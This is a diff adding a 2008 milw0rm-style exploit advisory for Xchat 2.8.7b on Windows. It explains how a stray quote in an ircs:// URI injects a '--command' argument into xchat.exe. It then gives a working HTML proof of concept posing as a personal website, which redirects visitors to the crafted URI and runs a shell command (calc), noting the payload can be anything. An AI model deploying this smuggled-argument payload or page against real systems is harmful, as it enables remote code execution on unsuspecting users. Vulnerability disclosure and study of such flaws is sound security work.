@@ -1,0 +1,35 @@
+##################################################################################################################
+#
+# Xchat <= 2.8.7b Remote Code Execution (tested on Windows XP SP1+SP2+SP3, IE6 & IE7 fully patched)
+# Vendor : http://xchat.org/
+# Affected Os : Windows *
+# Risk : critical
+#
+# This bug is related to the URI Handler vulnerability but the approch is a bit different.
+# We don't use any % or  ../../../ as the others related bugs, just a single "
+# According to the registry , when the IRCS:// URI is called , the command launched is :
+# C:\Program Files\xchat\xchat.exe --existing --url="%1"
+#
+# The xchat --help option tells us :
+# " --command=COMMAND :Send a command to existing xchat "
+#
+# So we add a simple " at the end of the URL and we're in business ?
+# Yep =) ircs://blabla@3.3.3.3" --command "shell calc"
+#
+# Note: The victim needs to be connected to an irc server , and also need IE * .
+#
+#
+#
+# Greetz: French/Quebec community, http://spiritofhack.net/
+#
+# "If in times like theses you can talk about individual freedoom, you're propably a terrorist"
+#
+# Poc: this only launch the calc, sky is the limit passed this point.
+<html>
+<head><title>Welcome to my personal website</title></head>
+<body>
+<script>document.location='ircs://blabla@3.3.3.3" --command "shell calc"'</script>
+</body>
+</html>
+
+# milw0rm.com [2008-06-13]
